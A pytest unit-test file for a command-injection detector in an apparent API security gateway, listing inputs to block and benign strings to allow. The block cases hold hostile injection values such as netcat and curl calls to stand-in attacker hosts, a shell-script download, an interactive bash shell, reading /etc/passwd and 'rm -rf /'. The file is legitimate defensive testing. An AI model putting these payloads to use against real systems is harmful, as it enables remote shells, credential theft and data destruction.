"""
Phase 11 — Dedicated Command Injection Detector Unit Tests
===========================================================
Tests all BLOCK and ALLOW cases specified in SentinelGate Master Plan.
"""
from __future__ import annotations

import pytest

from backend.schemas.context import GatewayContext
from backend.threat_detection.normalizer import extract_inspection_targets
from backend.threat_detection.rules.cmd_injection import CommandInjectionRule


@pytest.fixture
def cmd_rule() -> CommandInjectionRule:
    return CommandInjectionRule()


def check_cmd_injection(rule: CommandInjectionRule, value: str) -> bool:
    ctx = GatewayContext(
        client_ip="127.0.0.1",
        method="GET",
        path="/api/search",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        query_params={"cmd": value},
    )
    targets = extract_inspection_targets(ctx)
    matches = rule.inspect(ctx, targets)
    return len(matches) > 0


class TestCommandInjectionDetector:
    """Master Plan Test Specifications for Command Injection Detection."""

    @pytest.mark.parametrize(
        "payload",
        [
            "; whoami",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`id`",
            "$(curl http://evil.com)",
            "; id",
            "& uname -a",
            "| bash -i",
            "$(wget http://malicious.org/shell.sh)",
            "test; rm -rf /",
        ],
    )
    def test_cmd_injection_block_cases(
        self, cmd_rule: CommandInjectionRule, payload: str
    ) -> None:
        """Every command chaining and shell substitution payload must be blocked."""
        assert check_cmd_injection(cmd_rule, payload) is True, f"Failed to detect cmd injection: {payload}"

    @pytest.mark.parametrize(
        "payload",
        [
            "ping time 300ms",
            "use | as separator in CSV",
            "hello & goodbye",
            "search item; and more",
            "normal string without backticks or shell commands",
            "price list | summary table",
        ],
    )
    def test_cmd_injection_allow_cases(
        self, cmd_rule: CommandInjectionRule, payload: str
    ) -> None:
        """Legitimate strings with symbols but no shell executions must be allowed."""
        assert check_cmd_injection(cmd_rule, payload) is False, f"False positive on: {payload}"
